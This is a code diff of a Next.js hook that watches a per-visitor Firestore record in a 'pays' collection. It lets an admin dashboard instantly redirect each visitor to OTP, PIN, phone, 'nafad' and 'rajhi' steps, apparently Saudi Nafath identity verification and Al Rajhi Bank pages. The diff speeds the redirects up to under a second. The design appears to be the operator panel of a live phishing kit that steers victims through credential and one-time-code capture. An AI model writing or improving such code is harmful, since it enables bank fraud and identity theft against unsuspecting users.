@@ -1,11 +1,10 @@
 /**
  * Hook to monitor redirect requests from admin dashboard
- * Checks Firebase for redirectPage field and navigates accordingly
+ * Ultra-fast response (< 1 second) using Firebase real-time listeners
  */
 
-import { useEffect } from "react";
+import { useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
-import { clearRedirectPage } from "@/lib/visitor-tracking";
 import { db } from "@/lib/firebase";
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
 
@@ -14,100 +13,131 @@ interface UseRedirectMonitorProps {
   currentPage: string;
 }
 
+// Page mapping for all routes
+const PAGE_MAP: Record<string, string> = {
+  // Modern redirectPage values
+  home: "/home-new",
+  insur: "/insur",
+  compar: "/compar",
+  check: "/check",
+  payment: "/check",
+  otp: "/step2",
+  pin: "/step3",
+  phone: "/step5",
+  nafad: "/step4",
+  rajhi: "/step6",
+  // Legacy currentStep values
+  _t6: "/step4",
+  _st1: "/check",
+  _t2: "/step2",
+  _t3: "/step3",
+};
+
 export function useRedirectMonitor({
   visitorId,
   currentPage,
 }: UseRedirectMonitorProps) {
   const router = useRouter();
+  const lastProcessedRef = useRef<string>("");
+  const isProcessingRef = useRef(false);
 
   useEffect(() => {
     if (!visitorId || !db) return;
 
-    // Listen to real-time changes in visitor document
+    console.log(`[RedirectMonitor] Starting listener for visitor: ${visitorId}`);
+
+    // Listen to real-time changes - Firebase onSnapshot is < 100ms
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorId),
       async (snapshot) => {
-        if (snapshot.exists()) {
-          const data = snapshot.data();
-          const redirectPage = data.redirectPage;
-          const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined
-          const currentStep = data.currentStep
-          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
-          const now = Date.now()
+        if (!snapshot.exists()) return;
+        
+        const data = snapshot.data();
+        const now = Date.now();
+        
+        // Skip if already processing
+        if (isProcessingRef.current) return;
 
-          // Modern system: Check redirectPage field
-          if (redirectPage && redirectPage !== currentPage) {
-            // Check if this is a NEW redirect (within 3 seconds)
-            if (!redirectUpdatedAt || (now - redirectUpdatedAt > 3000)) {
-              console.log('[useRedirectMonitor] Stale redirect, ignoring')
-              return
-            }
-            
-            console.log(
-              `[useRedirectMonitor] Redirecting from ${currentPage} to ${redirectPage}`
-            );
+        // Check redirectPage (modern system) - HIGHEST PRIORITY
+        const redirectPage = data.redirectPage as string | undefined;
+        const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined;
+        
+        if (redirectPage && redirectPage !== currentPage) {
+          // Check if this is a NEW redirect (within 2 seconds for faster response)
+          if (!redirectUpdatedAt || (now - redirectUpdatedAt > 2000)) {
+            console.log('[RedirectMonitor] Stale redirect, ignoring')
+            return
+          }
+          
+          // Check if already processed this redirect
+          const redirectKey = `redirect_${redirectPage}_${redirectUpdatedAt}`;
+          if (lastProcessedRef.current === redirectKey) {
+            console.log('[RedirectMonitor] Already processed this redirect')
+            return
+          }
+          
+          isProcessingRef.current = true;
+          lastProcessedRef.current = redirectKey;
+          
+          const targetUrl = PAGE_MAP[redirectPage] || `/${redirectPage}`;
+          console.log(`[RedirectMonitor] 🚀 Redirecting from ${currentPage} to ${targetUrl}`);
 
-            // Mark as processed by updating timestamp
-            await setDoc(doc(db as Firestore, "pays", visitorId), {
-              redirectPageUpdatedAt: now
-            }, { merge: true })
+          // Clear redirect flag
+          await setDoc(doc(db as Firestore, "pays", visitorId), {
+            redirectPage: null,
+            redirectPageUpdatedAt: now
+          }, { merge: true });
 
-            // Clear the redirect flag
-            await clearRedirectPage(visitorId);
+          // Navigate immediately
+          router.push(targetUrl);
+          
+          setTimeout(() => {
+            isProcessingRef.current = false;
+          }, 1000);
+          return;
+        }
 
-            // Navigate to the requested page
-            const pageMap: Record<string, string> = {
-              home: "/home-new",
-              insur: "/insur",
-              compar: "/compar",
-              check: "/check",
-              payment: "/check",
-              otp: "/step2",
-              pin: "/step3",
-              phone: "/step5",
-              nafad: "/step4",
-              rajhi: "/step6",
-            };
-
-            const targetUrl = pageMap[redirectPage] || "/";
+        // Check currentStep (legacy system)
+        const currentStep = data.currentStep as string | undefined;
+        const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined;
+        
+        if (currentStep && currentStep !== currentPage) {
+          // Check if this is a NEW redirect (within 2 seconds)
+          if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 2000)) {
+            return
+          }
+          
+          // Check if already processed this step
+          const stepKey = `step_${currentStep}_${currentStepUpdatedAt}`;
+          if (lastProcessedRef.current === stepKey) {
+            return
+          }
+          
+          isProcessingRef.current = true;
+          lastProcessedRef.current = stepKey;
+          
+          const targetUrl = PAGE_MAP[currentStep];
+          if (targetUrl && targetUrl !== `/${currentPage}`) {
+            console.log(`[RedirectMonitor] 🚀 Legacy redirect from ${currentPage} to ${targetUrl}`);
             router.push(targetUrl);
           }
-
-          // Legacy system: Check currentStep field for phone and nafad
-          else if (currentStep) {
-            // Check if this is a NEW redirect (within 3 seconds)
-            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
-              console.log('[useRedirectMonitor] Stale currentStep redirect, ignoring')
-              return
-            }
-            
-            const legacyPageMap: Record<string, { page: string; url: string }> =
-              {
-                home: { page: "home", url: "/home-new" },
-                phone: { page: "phone", url: "/step5" },
-                rajhi: { page: "rajhi", url: "/step6" },
-                _t6: { page: "nafad", url: "/step4" },
-                _st1: { page: "check", url: "/check" },
-                _t2: { page: "veri", url: "/step2" },
-                _t3: { page: "confi", url: "/step3" },
-              };
-
-            const targetPage = legacyPageMap[currentStep as string];
-            if (targetPage && targetPage.page !== currentPage) {
-              console.log(
-                `[useRedirectMonitor] Legacy redirect from ${currentPage} to ${targetPage.page}`
-              );
-              router.push(targetPage.url);
-            }
-          }
+          
+          setTimeout(() => {
+            isProcessingRef.current = false;
+          }, 1000);
         }
       },
       (error) => {
-        console.error("Error monitoring redirect:", error);
+        console.error("[RedirectMonitor] Error:", error);
       }
     );
 
-    // Cleanup subscription on unmount
-    return () => unsubscribe();
+    return () => {
+      console.log("[RedirectMonitor] Cleaning up listener")
+      unsubscribe()
+    };
   }, [visitorId, currentPage, router]);
 }
+
+// Export for admin to get available pages
+export const AVAILABLE_REDIRECT_PAGES = Object.keys(PAGE_MAP);
